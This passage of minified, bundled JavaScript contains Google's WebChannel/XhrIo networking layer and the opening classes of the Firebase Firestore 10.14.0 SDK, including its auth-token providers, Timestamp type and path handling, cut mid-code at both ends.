0))||m||D||d.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[b,z]of d)this.g.setRequestHeader(b,z);this.H&&(this.g.responseType=this.H),"withCredentials"in this.g&&this.g.withCredentials!==this.J&&(this.g.withCredentials=this.J);try{mp(this),this.u=!0,this.g.send(a),this.u=!1}catch(b){dp(this,b)}};function dp(a,c){a.h=!1,a.g&&(a.j=!0,a.g.abort(),a.j=!1),a.l=c,a.m=5,fp(a),Go(a)}function fp(a){a.A||(a.A=!0,nt(a,"complete"),nt(a,"error"))}t.abort=function(a){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.m=a||7,nt(this,"complete"),nt(this,"abort"),Go(this))},t.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),Go(this,!0)),Se.aa.N.call(this)},t.Ea=function(){this.s||(this.B||this.u||this.j?pp(this):this.bb())},t.bb=function(){pp(this)};function pp(a){if(a.h&&typeof o<"u"&&(!a.v[1]||ln(a)!=4||a.Z()!=2)){if(a.u&&ln(a)==4)Lf(a.Ea,0,a);else if(nt(a,"readystatechange"),ln(a)==4){a.h=!1;try{const z=a.Z();e:switch(z){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var c=!0;break e;default:c=!1}var d;if(!(d=c)){var m;if(m=z===0){var D=String(a.D).match(ip)[1]||null;!D&&l.self&&l.self.location&&(D=l.self.location.protocol.slice(0,-1)),m=!AE.test(D?D.toLowerCase():"")}d=m}if(d)nt(a,"complete"),nt(a,"success");else{a.m=6;try{var b=2<ln(a)?a.g.statusText:""}catch{b=""}a.l=b+" ["+a.Z()+"]",fp(a)}}finally{Go(a)}}}}function Go(a,c){if(a.g){mp(a);const d=a.g,m=a.v[0]?()=>{}:null;a.g=null,a.v=null,c||nt(a,"ready");try{d.onreadystatechange=m}catch{}}}function mp(a){a.I&&(l.clearTimeout(a.I),a.I=null)}t.isActive=function(){return!!this.g};function ln(a){return a.g?a.g.readyState:0}t.Z=function(){try{return 2<ln(this)?this.g.status:-1}catch{return-1}},t.oa=function(){try{return this.g?this.g.responseText:""}catch{return""}},t.Oa=function(a){if(this.g){var c=this.g.responseText;return a&&c.indexOf(a)==0&&(c=c.substring(a.length)),iE(c)}};function gp(a){try{if(!a.g)return null;if("response"in a.g)return a.g.response;switch(a.H){case"":case"text":return a.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in a.g)return a.g.mozResponseArrayBuffer}return null}catch{return null}}function RE(a){const c={};a=(a.g&&2<=ln(a)&&a.g.getAllResponseHeaders()||"").split(`\r
`);for(let m=0;m<a.length;m++){if(_(a[m]))continue;var d=P(a[m]);const D=d[0];if(d=d[1],typeof d!="string")continue;d=d.trim();const b=c[D]||[];c[D]=b,b.push(d)}I(c,function(m){return m.join(", ")})}t.Ba=function(){return this.m},t.Ka=function(){return typeof this.l=="string"?this.l:String(this.l)};function os(a,c,d){return d&&d.internalChannelParams&&d.internalChannelParams[a]||c}function yp(a){this.Aa=0,this.i=[],this.j=new Zi,this.ia=this.qa=this.I=this.W=this.g=this.ya=this.D=this.H=this.m=this.S=this.o=null,this.Ya=this.U=0,this.Va=os("failFast",!1,a),this.F=this.C=this.u=this.s=this.l=null,this.X=!0,this.za=this.T=-1,this.Y=this.v=this.B=0,this.Ta=os("baseRetryDelayMs",5e3,a),this.cb=os("retryDelaySeedMs",1e4,a),this.Wa=os("forwardChannelMaxRetries",2,a),this.wa=os("forwardChannelRequestTimeoutMs",2e4,a),this.pa=a&&a.xmlHttpFactory||void 0,this.Xa=a&&a.Tb||void 0,this.Ca=a&&a.useFetchStreams||!1,this.L=void 0,this.J=a&&a.supportsCrossDomainXhr||!1,this.K="",this.h=new Jf(a&&a.concurrentRequestLimit),this.Da=new IE,this.P=a&&a.fastHandshake||!1,this.O=a&&a.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.Ua=a&&a.Rb||!1,a&&a.xa&&this.j.xa(),a&&a.forceLongPolling&&(this.X=!1),this.ba=!this.P&&this.X&&a&&a.detectBufferingProxy||!1,this.ja=void 0,a&&a.longPollingTimeout&&0<a.longPollingTimeout&&(this.ja=a.longPollingTimeout),this.ca=void 0,this.R=0,this.M=!1,this.ka=this.A=null}t=yp.prototype,t.la=8,t.G=1,t.connect=function(a,c,d,m){rt(0),this.W=a,this.H=c||{},d&&m!==void 0&&(this.H.OSID=d,this.H.OAID=m),this.F=this.X,this.I=Cp(this,null,this.W),Qo(this)};function Nu(a){if(vp(a),a.G==3){var c=a.U++,d=an(a.I);if(me(d,"SID",a.K),me(d,"RID",c),me(d,"TYPE","terminate"),as(a,d),c=new kn(a,a.j,c),c.L=2,c.v=Wo(an(d)),d=!1,l.navigator&&l.navigator.sendBeacon)try{d=l.navigator.sendBeacon(c.v.toString(),"")}catch{}!d&&l.Image&&(new Image().src=c.v,d=!0),d||(c.g=Rp(c.j,null),c.g.ea(c.v)),c.F=Date.now(),zo(c)}Ap(a)}function Ko(a){a.g&&(bu(a),a.g.cancel(),a.g=null)}function vp(a){Ko(a),a.u&&(l.clearTimeout(a.u),a.u=null),Yo(a),a.h.cancel(),a.s&&(typeof a.s=="number"&&l.clearTimeout(a.s),a.s=null)}function Qo(a){if(!Zf(a.h)&&!a.s){a.s=!0;var c=a.Ga;ct||B(),$||(ct(),$=!0),Q.add(c,a),a.B=0}}function xE(a,c){return ep(a.h)>=a.h.j-(a.s?1:0)?!1:a.s?(a.i=c.D.concat(a.i),!0):a.G==1||a.G==2||a.B>=(a.Va?0:a.Wa)?!1:(a.s=Ji(g(a.Ga,a,c),Sp(a,a.B)),a.B++,!0)}t.Ga=function(a){if(this.s)if(this.s=null,this.G==1){if(!a){this.U=Math.floor(1e5*Math.random()),a=this.U++;const D=new kn(this,this.j,a);let b=this.o;if(this.S&&(b?(b=y(b),C(b,this.S)):b=this.S),this.m!==null||this.O||(D.H=b,b=null),this.P)e:{for(var c=0,d=0;d<this.i.length;d++){t:{var m=this.i[d];if("__data__"in m.map&&(m=m.map.__data__,typeof m=="string")){m=m.length;break t}m=void 0}if(m===void 0)break;if(c+=m,4096<c){c=d;break e}if(c===4096||d===this.i.length-1){c=d+1;break e}}c=1e3}else c=1e3;c=wp(this,D,c),d=an(this.I),me(d,"RID",a),me(d,"CVER",22),this.D&&me(d,"X-HTTP-Session-Id",this.D),as(this,d),b&&(this.O?c="headers="+encodeURIComponent(String(hp(b)))+"&"+c:this.m&&Pu(d,this.m,b)),ku(this.h,D),this.Ua&&me(d,"TYPE","init"),this.P?(me(d,"$req",c),me(d,"SID","null"),D.T=!0,Au(D,d,null)):Au(D,d,c),this.G=2}}else this.G==3&&(a?_p(this,a):this.i.length==0||Zf(this.h)||_p(this))};function _p(a,c){var d;c?d=c.l:d=a.U++;const m=an(a.I);me(m,"SID",a.K),me(m,"RID",d),me(m,"AID",a.T),as(a,m),a.m&&a.o&&Pu(m,a.m,a.o),d=new kn(a,a.j,d,a.B+1),a.m===null&&(d.H=a.o),c&&(a.i=c.D.concat(a.i)),c=wp(a,d,1e3),d.I=Math.round(.5*a.wa)+Math.round(.5*a.wa*Math.random()),ku(a.h,d),Au(d,m,c)}function as(a,c){a.H&&j(a.H,function(d,m){me(c,m,d)}),a.l&&rp({},function(d,m){me(c,m,d)})}function wp(a,c,d){d=Math.min(a.i.length,d);var m=a.l?g(a.l.Na,a.l,a):null;e:{var D=a.i;let b=-1;for(;;){const z=["count="+d];b==-1?0<d?(b=D[0].g,z.push("ofs="+b)):b=0:z.push("ofs="+b);let de=!0;for(let Me=0;Me<d;Me++){let ae=D[Me].g;const He=D[Me].map;if(ae-=b,0>ae)b=Math.max(0,D[Me].g-100),de=!1;else try{SE(He,z,"req"+ae+"_")}catch{m&&m(He)}}if(de){m=z.join("&");break e}}}return a=a.i.splice(0,d),c.D=a,m}function Ep(a){if(!a.g&&!a.u){a.Y=1;var c=a.Fa;ct||B(),$||(ct(),$=!0),Q.add(c,a),a.v=0}}function Du(a){return a.g||a.u||3<=a.v?!1:(a.Y++,a.u=Ji(g(a.Fa,a),Sp(a,a.v)),a.v++,!0)}t.Fa=function(){if(this.u=null,Tp(this),this.ba&&!(this.M||this.g==null||0>=this.R)){var a=2*this.R;this.j.info("BP detection timer enabled: "+a),this.A=Ji(g(this.ab,this),a)}},t.ab=function(){this.A&&(this.A=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.M=!0,rt(10),Ko(this),Tp(this))};function bu(a){a.A!=null&&(l.clearTimeout(a.A),a.A=null)}function Tp(a){a.g=new kn(a,a.j,"rpc",a.Y),a.m===null&&(a.g.H=a.o),a.g.O=0;var c=an(a.qa);me(c,"RID","rpc"),me(c,"SID",a.K),me(c,"AID",a.T),me(c,"CI",a.F?"0":"1"),!a.F&&a.ja&&me(c,"TO",a.ja),me(c,"TYPE","xmlhttp"),as(a,c),a.m&&a.o&&Pu(c,a.m,a.o),a.L&&(a.g.I=a.L);var d=a.g;a=a.ia,d.L=1,d.v=Wo(an(c)),d.m=null,d.P=!0,Qf(d,a)}t.Za=function(){this.C!=null&&(this.C=null,Ko(this),Du(this),rt(19))};function Yo(a){a.C!=null&&(l.clearTimeout(a.C),a.C=null)}function Ip(a,c){var d=null;if(a.g==c){Yo(a),bu(a),a.g=null;var m=2}else if(xu(a.h,c))d=c.D,tp(a.h,c),m=1;else return;if(a.G!=0){if(c.o)if(m==1){d=c.m?c.m.length:0,c=Date.now()-c.F;var D=a.B;m=Fo(),nt(m,new qf(m,d)),Qo(a)}else Ep(a);else if(D=c.s,D==3||D==0&&0<c.X||!(m==1&&xE(a,c)||m==2&&Du(a)))switch(d&&0<d.length&&(c=a.h,c.i=c.i.concat(d)),D){case 1:yr(a,5);break;case 4:yr(a,10);break;case 3:yr(a,6);break;default:yr(a,2)}}}function Sp(a,c){let d=a.Ta+Math.floor(Math.random()*a.cb);return a.isActive()||(d*=2),d*c}function yr(a,c){if(a.j.info("Error code "+c),c==2){var d=g(a.fb,a),m=a.Xa;const D=!m;m=new gr(m||"//www.google.com/images/cleardot.gif"),l.location&&l.location.protocol=="http"||Bo(m,"https"),Wo(m),D?EE(m.toString(),d):TE(m.toString(),d)}else rt(2);a.G=0,a.l&&a.l.sa(c),Ap(a),vp(a)}t.fb=function(a){a?(this.j.info("Successfully pinged google.com"),rt(2)):(this.j.info("Failed to ping google.com"),rt(1))};function Ap(a){if(a.G=0,a.ka=[],a.l){const c=np(a.h);(c.length!=0||a.i.length!=0)&&(N(a.ka,c),N(a.ka,a.i),a.h.i.length=0,k(a.i),a.i.length=0),a.l.ra()}}function Cp(a,c,d){var m=d instanceof gr?an(d):new gr(d);if(m.g!="")c&&(m.g=c+"."+m.g),$o(m,m.s);else{var D=l.location;m=D.protocol,c=c?c+"."+D.hostname:D.hostname,D=+D.port;var b=new gr(null);m&&Bo(b,m),c&&(b.g=c),D&&$o(b,D),d&&(b.l=d),m=b}return d=a.D,c=a.ya,d&&c&&me(m,d,c),me(m,"VER",a.la),as(a,m),m}function Rp(a,c,d){if(c&&!a.J)throw Error("Can't create secondary domain capable XhrIo object.");return c=a.Ca&&!a.pa?new Se(new qo({eb:d})):new Se(a.pa),c.Ha(a.J),c}t.isActive=function(){return!!this.l&&this.l.isActive(this)};function xp(){}t=xp.prototype,t.ua=function(){},t.ta=function(){},t.sa=function(){},t.ra=function(){},t.isActive=function(){return!0},t.Na=function(){};function Xo(){}Xo.prototype.g=function(a,c){return new yt(a,c)};function yt(a,c){qe.call(this),this.g=new yp(c),this.l=a,this.h=c&&c.messageUrlParams||null,a=c&&c.messageHeaders||null,c&&c.clientProtocolHeaderRequired&&(a?a["X-Client-Protocol"]="webchannel":a={"X-Client-Protocol":"webchannel"}),this.g.o=a,a=c&&c.initMessageHeaders||null,c&&c.messageContentType&&(a?a["X-WebChannel-Content-Type"]=c.messageContentType:a={"X-WebChannel-Content-Type":c.messageContentType}),c&&c.va&&(a?a["X-WebChannel-Client-Profile"]=c.va:a={"X-WebChannel-Client-Profile":c.va}),this.g.S=a,(a=c&&c.Sb)&&!_(a)&&(this.g.m=a),this.v=c&&c.supportsCrossDomainXhr||!1,this.u=c&&c.sendRawJson||!1,(c=c&&c.httpSessionIdParam)&&!_(c)&&(this.g.D=c,a=this.h,a!==null&&c in a&&(a=this.h,c in a&&delete a[c])),this.j=new Kr(this)}A(yt,qe),yt.prototype.m=function(){this.g.l=this.j,this.v&&(this.g.J=!0),this.g.connect(this.l,this.h||void 0)},yt.prototype.close=function(){Nu(this.g)},yt.prototype.o=function(a){var c=this.g;if(typeof a=="string"){var d={};d.__data__=a,a=d}else this.u&&(d={},d.__data__=_u(a),a=d);c.i.push(new hE(c.Ya++,a)),c.G==3&&Qo(c)},yt.prototype.N=function(){this.g.l=null,delete this.j,Nu(this.g),delete this.g,yt.aa.N.call(this)};function kp(a){Eu.call(this),a.__headers__&&(this.headers=a.__headers__,this.statusCode=a.__status__,delete a.__headers__,delete a.__status__);var c=a.__sm__;if(c){e:{for(const d in c){a=d;break e}a=void 0}(this.i=a)&&(a=this.i,c=c!==null&&a in c?c[a]:void 0),this.data=c}else this.data=a}A(kp,Eu);function Pp(){Tu.call(this),this.status=1}A(Pp,Tu);function Kr(a){this.g=a}A(Kr,xp),Kr.prototype.ua=function(){nt(this.g,"a")},Kr.prototype.ta=function(a){nt(this.g,new kp(a))},Kr.prototype.sa=function(a){nt(this.g,new Pp)},Kr.prototype.ra=function(){nt(this.g,"b")},Xo.prototype.createWebChannel=Xo.prototype.g,yt.prototype.send=yt.prototype.o,yt.prototype.open=yt.prototype.m,yt.prototype.close=yt.prototype.close,D0=function(){return new Xo},N0=function(){return Fo()},P0=pr,Sh={mb:0,pb:1,qb:2,Jb:3,Ob:4,Lb:5,Mb:6,Kb:7,Ib:8,Nb:9,PROXY:10,NOPROXY:11,Gb:12,Cb:13,Db:14,Bb:15,Eb:16,Fb:17,ib:18,hb:19,jb:20},Uo.NO_ERROR=0,Uo.TIMEOUT=8,Uo.HTTP_ERROR=6,Fa=Uo,Hf.COMPLETE="complete",k0=Hf,zf.EventType=Yi,Yi.OPEN="a",Yi.CLOSE="b",Yi.ERROR="c",Yi.MESSAGE="d",qe.prototype.listen=qe.prototype.K,Ts=zf,Se.prototype.listenOnce=Se.prototype.L,Se.prototype.getLastError=Se.prototype.Ka,Se.prototype.getLastErrorCode=Se.prototype.Ba,Se.prototype.getStatus=Se.prototype.Z,Se.prototype.getResponseJson=Se.prototype.Oa,Se.prototype.getResponseText=Se.prototype.oa,Se.prototype.send=Se.prototype.ea,Se.prototype.setWithCredentials=Se.prototype.Ha,x0=Se}).apply(typeof ya<"u"?ya:typeof self<"u"?self:typeof window<"u"?window:{});const Ig="@firebase/firestore";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xe{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}Xe.UNAUTHENTICATED=new Xe(null),Xe.GOOGLE_CREDENTIALS=new Xe("google-credentials-uid"),Xe.FIRST_PARTY=new Xe("first-party-uid"),Xe.MOCK_USER=new Xe("mock-user");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let qi="10.14.0";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Mr=new Fd("@firebase/firestore");function gs(){return Mr.logLevel}function G(t,...e){if(Mr.logLevel<=re.DEBUG){const n=e.map(Xd);Mr.debug(`Firestore (${qi}): ${t}`,...n)}}function An(t,...e){if(Mr.logLevel<=re.ERROR){const n=e.map(Xd);Mr.error(`Firestore (${qi}): ${t}`,...n)}}function Di(t,...e){if(Mr.logLevel<=re.WARN){const n=e.map(Xd);Mr.warn(`Firestore (${qi}): ${t}`,...n)}}function Xd(t){if(typeof t=="string")return t;try{/**
* @license
* Copyright 2020 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/return function(n){return JSON.stringify(n)}(t)}catch{return t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function X(t="Unexpected state"){const e=`FIRESTORE (${qi}) INTERNAL ASSERTION FAILED: `+t;throw An(e),new Error(e)}function ce(t,e){t||X()}function ee(t,e){return t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const O={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class H extends xn{constructor(e,n){super(e,n),this.code=e,this.message=n,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yn{constructor(){this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class b0{constructor(e,n){this.user=n,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class ox{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,n){e.enqueueRetryable(()=>n(Xe.UNAUTHENTICATED))}shutdown(){}}class ax{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,n){this.changeListener=n,e.enqueueRetryable(()=>n(this.token.user))}shutdown(){this.changeListener=null}}class lx{constructor(e){this.t=e,this.currentUser=Xe.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,n){ce(this.o===void 0);let r=this.i;const i=u=>this.i!==r?(r=this.i,n(u)):Promise.resolve();let s=new yn;this.o=()=>{this.i++,this.currentUser=this.u(),s.resolve(),s=new yn,e.enqueueRetryable(()=>i(this.currentUser))};const o=()=>{const u=s;e.enqueueRetryable(async()=>{await u.promise,await i(this.currentUser)})},l=u=>{G("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=u,this.o&&(this.auth.addAuthTokenListener(this.o),o())};this.t.onInit(u=>l(u)),setTimeout(()=>{if(!this.auth){const u=this.t.getImmediate({optional:!0});u?l(u):(G("FirebaseAuthCredentialsProvider","Auth not yet detected"),s.resolve(),s=new yn)}},0),o()}getToken(){const e=this.i,n=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(n).then(r=>this.i!==e?(G("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):r?(ce(typeof r.accessToken=="string"),new b0(r.accessToken,this.currentUser)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return ce(e===null||typeof e=="string"),new Xe(e)}}class ux{constructor(e,n,r){this.l=e,this.h=n,this.P=r,this.type="FirstParty",this.user=Xe.FIRST_PARTY,this.I=new Map}T(){return this.P?this.P():null}get headers(){this.I.set("X-Goog-AuthUser",this.l);const e=this.T();return e&&this.I.set("Authorization",e),this.h&&this.I.set("X-Goog-Iam-Authorization-Token",this.h),this.I}}class cx{constructor(e,n,r){this.l=e,this.h=n,this.P=r}getToken(){return Promise.resolve(new ux(this.l,this.h,this.P))}start(e,n){e.enqueueRetryable(()=>n(Xe.FIRST_PARTY))}shutdown(){}invalidateToken(){}}class hx{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class dx{constructor(e){this.A=e,this.forceRefresh=!1,this.appCheck=null,this.R=null}start(e,n){ce(this.o===void 0);const r=s=>{s.error!=null&&G("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${s.error.message}`);const o=s.token!==this.R;return this.R=s.token,G("FirebaseAppCheckTokenProvider",`Received ${o?"new":"existing"} token.`),o?n(s.token):Promise.resolve()};this.o=s=>{e.enqueueRetryable(()=>r(s))};const i=s=>{G("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=s,this.o&&this.appCheck.addTokenListener(this.o)};this.A.onInit(s=>i(s)),setTimeout(()=>{if(!this.appCheck){const s=this.A.getImmediate({optional:!0});s?i(s):G("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}},0)}getToken(){const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then(n=>n?(ce(typeof n.token=="string"),this.R=n.token,new hx(n.token)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function fx(t){const e=typeof self<"u"&&(self.crypto||self.msCrypto),n=new Uint8Array(t);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(n);else for(let r=0;r<t;r++)n[r]=Math.floor(256*Math.random());return n}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class V0{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=Math.floor(256/e.length)*e.length;let r="";for(;r.length<20;){const i=fx(40);for(let s=0;s<i.length;++s)r.length<20&&i[s]<n&&(r+=e.charAt(i[s]%e.length))}return r}}function le(t,e){return t<e?-1:t>e?1:0}function bi(t,e,n){return t.length===e.length&&t.every((r,i)=>n(r,e[i]))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pe{constructor(e,n){if(this.seconds=e,this.nanoseconds=n,n<0)throw new H(O.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+n);if(n>=1e9)throw new H(O.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+n);if(e<-62135596800)throw new H(O.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new H(O.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}static now(){return pe.fromMillis(Date.now())}static fromDate(e){return pe.fromMillis(e.getTime())}static fromMillis(e){const n=Math.floor(e/1e3),r=Math.floor(1e6*(e-1e3*n));return new pe(n,r)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/1e6}_compareTo(e){return this.seconds===e.seconds?le(this.nanoseconds,e.nanoseconds):le(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){const e=this.seconds- -62135596800;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Z{constructor(e){this.timestamp=e}static fromTimestamp(e){return new Z(e)}static min(){return new Z(new pe(0,0))}static max(){return new Z(new pe(253402300799,999999999))}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lo{constructor(e,n,r){n===void 0?n=0:n>e.length&&X(),r===void 0?r=e.length-n:r>e.length-n&&X(),this.segments=e,this.offset=n,this.len=r}get length(){return this.len}isEqual(e){return lo.comparator(this,e)===0}child(e){const n=this.segments.slice(this.offset,this.limit());return e instanceof lo?e.forEach(r=>{n.push(r)}):n.push(e),this.construct(n)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let n=0;n<this.length;n++)if(this.get(n)!==e.get(n))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let n=0;n<this.length;n++)if(this.get(n)!==e.get(n))return!1;return!0}forEach(e){for(let 